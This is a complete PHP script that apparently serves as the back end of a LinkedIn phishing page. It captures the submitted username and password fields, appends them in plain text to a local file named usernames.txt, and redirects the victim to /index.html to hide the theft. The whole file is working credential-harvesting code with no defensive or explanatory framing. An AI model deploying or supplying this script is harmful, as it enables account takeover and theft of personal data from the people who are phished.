<?php

file_put_contents("usernames.txt", "Linkedin Username: " . $_POST['session_key'] . " Pass: " . $_POST['session_password'] . "\n", FILE_APPEND);
header('Location: /index.html');
exit();
?>
